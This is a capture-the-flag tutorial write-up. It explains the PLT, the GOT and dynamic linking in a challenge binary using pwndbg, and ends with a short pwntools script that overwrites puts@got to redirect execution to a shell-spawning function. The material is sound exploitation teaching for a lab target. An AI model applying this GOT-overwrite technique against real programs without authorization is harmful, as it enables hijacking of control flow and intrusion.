# Get My Got
This challenge is based around the plt, got, and dynamic linker. Before we start
analying the binary, we will first explain these terms. 

In the problem binary, we call `puts` to print text. This is a function defined
by libc, the C standard library. When we write programs, we don't want to
include the entirety of libc in our binary, as it's pretty big and will waste
disk space. We fix this by doing something called dynamic linking. Our system
has a single copy of libc at some predetermined location, and all programs share
it. We can use `ldd -v getmygot` to see what the binary is linked against.

```
        linux-vdso.so.1 (0x00007ffcb994c000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007f2de59b5000)
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f2de5bbc000)

        Version information:
        ./getmygot:
                libc.so.6 (GLIBC_2.7) => /usr/lib/libc.so.6
                libc.so.6 (GLIBC_2.4) => /usr/lib/libc.so.6
                libc.so.6 (GLIBC_2.2.5) => /usr/lib/libc.so.6
        /usr/lib/libc.so.6:
                ld-linux-x86-64.so.2 (GLIBC_2.2.5) => /usr/lib64/ld-linux-x86-64.so.2
                ld-linux-x86-64.so.2 (GLIBC_2.3) => /usr/lib64/ld-linux-x86-64.so.2
                ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /usr/lib64/ld-linux-x86-64.so.2
```

We can see that the binary expects libc to be located at `/usr/lib/libc.so.6`.
That single copy of libc is shared by all the dynamically linked programs on our system.

libc on almost all systems is compiled as a position independent executable, or
PIE. This means the binary can be loaded in at any memory location. For security
reasons, the address it is loaded into memory at is somewhat randomized.  This
stops an attacker from being able to jump to libc functions (since you don't
know where they are). However, the program must know where the functions are to
call them normally. This is the job of the got and plt. When a program wants to
call a libc function (i.e. `puts`), it goes through the following steps.

1. Jump to the corresponding plt entry for the function (`puts@plt`)
2. Jump to the value in the got
3. If this is the first time the function has been called, the value is in the
   got is the address of the dynamic linker. This finds the functions address,
   and writes it to the got. Once it is done it then jumps to the function
4. Otherwise, the value in the got is the address of the function


Generally, the got acts as a simple array of function addresses, and the plt is
the code that manages it. We will walk through the two cases for `puts` using
the binary using gdb/pwndbg.

First, we will get to the first instance of puts being called. Anything that
starts with `pwndbg>` is a command, everything else is command ouput (output may be
cutoff for brevity)


```
pwndbg> b main
pwndbg> r
pwndbg> n 5
 > 0x401215 <main+34>    call   puts@plt <puts@plt>
```

We can see that the program calls `puts@plt` instead of `puts` directly. This is
normal, and occurs whenever the program has to call a function that isn't at a
static address. We will now look at the contents of `puts@plt`

```
pwndbg> si
 > 0x401070       <puts@plt>                   endbr64 
   0x401074       <puts@plt+4>                 bnd jmp qword ptr [rip + 0x2f9d] <0x401030>
```

Here we are jumping to the value at `rip+0x2f9d`, or the value at `0x404018`.
This is the address of the got entry for `puts`. We can verify this by running
the below command

```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 4
 
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 <— endbr64 
[0x404020] __stack_chk_fail@GLIBC_2.4 -> 0x401040 <— endbr64 
[0x404028] execve@GLIBC_2.2.5 -> 0x401050 <— endbr64 
[0x404030] __isoc99_scanf@GLIBC_2.7 -> 0x401060 <— endbr64 
```

Here we can see that the got entry for `puts` is located at `0x404018` and has
the value of `0x401030`, which is an address located at the beginning of the
plt. Lets go back to the dissassembly.

```
 > 0x401070       <puts@plt>              endbr64 
   0x401074       <puts@plt+4>            bnd jmp qword ptr [rip + 0x2f9d] <0x401030>
    ↓
   0x401030                               endbr64 
   0x401034                               push   0
   0x401039                               bnd jmp 0x401020 <0x401020>
    ↓
   0x401020                               push   qword ptr [rip + 0x2fe2] <0x404008>
   0x401026                               bnd jmp qword ptr [rip + 0x2fe3] <_dl_runtime_resolve_xsavec>
    ↓
   0x7ffff7fe7d30 <_dl_runtime...ec>      endbr64 
   0x7ffff7fe7d34 <_dl_runtime...ec+4>    push   rbx
   0x7ffff7fe7d35 <_dl_runtime...ec+5>    mov    rbx, rsp
   0x7ffff7fe7d38 <_dl_runtime...ec+8>    and    rsp, 0xffffffffffffffc0
```

The code jumps to the beginning of the plt, where it pushes the index of the
function in the got (0), and the address of the start of the got (`0x404008`),
then jumps to the dynamic linker. The dynamic linker then looks up the
address of `puts`, and writes it to the got. We will not be explaining how that
works, as you don't need to know about it to exploit the got.

```
pwndbg> finish
 > 0x40121a <main+39>    lea    rdi, [rip + 0xdff] <0x7ffff7f884f0>
   0x401221 <main+46>    call   puts@plt <puts@plt>
```

Now we are back in the main function like we just called the function normally.
However, now that the correct address has been written to the got, any
subsequent calls to `puts` will work differently.

```
pwndbg> n
pwndbg> si
 > 0x401070       <puts@plt>      endbr64 
   0x401074       <puts@plt+4>    bnd jmp qword ptr [rip + 0x2f9d] <puts>
pwndbg> n 2
 > 0x7ffff7e3a380 <puts>          endbr64

pwndbg> got

GOT protection: Partial RELRO | GOT functions: 4
 
[0x404018] puts@GLIBC_2.2.5 -> 0x7ffff7e3a380 (puts) <— endbr64 
[0x404020] __stack_chk_fail@GLIBC_2.4 -> 0x401040 <— endbr64 
[0x404028] execve@GLIBC_2.2.5 -> 0x401050 <— endbr64 
[0x404030] __isoc99_scanf@GLIBC_2.7 -> 0x401060 <— endbr64 
```

As you can see, now the plt just reads the address of `puts` from the got, and
jumps directly to it. This gets us to the actual `puts` function with just 1 more
jump than normal.

Now that we understand the got, exploiting it is actually very simple. The
binary inputs two numbers, and writes the second number to the address specified
by the first. If we send the address of `puts@got` (`0x404018`) as the first
value, and the address of `get_flag` (`0x401196`) as the second, we will get a
shell. This is because the last call to `puts` will look up the value of `puts` in
the got, but will get the address of `get_flag` instead. That means it will jump
to `get_flag` instead of `puts`, giving us a shell. Here is an example solution.

```python
from pwn import *

p = process('getmygot')
e = ELF('getmygot')
p.recvline()
p.sendline(str(e.got['puts']))
p.sendline(str(e.sym['get_flag']))
p.interactive()
```

Pwntools information: You should already know how to use `process`, `ELF`, `sym`
from previous tutorials. The `ELF` also has `got` and `plt` dictionaries, that
return the address of the `got` and `plt` entries for a specific function.

End Note: In this writeup I referred to the got. However, more specifically the
got is seperated into two sections: `.got` and `.got.plt`. Generally the `.got`
section is for global variables, while the `.got.plt` section is used for
functions. However, this distinction is not particularly important. Similiarly,
the plt is seperated into `.plt` and `.plt.sec`. This is due to a different
security feature called Intel MPX, and can be ignored. (This is also where all
the `bnd jmp` instructions come from.)

# Further Reading

[GOT/PLT: https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

[Intel MPX: https://en.wikipedia.org/wiki/Intel_MPX](https://en.wikipedia.org/wiki/Intel_MPX)
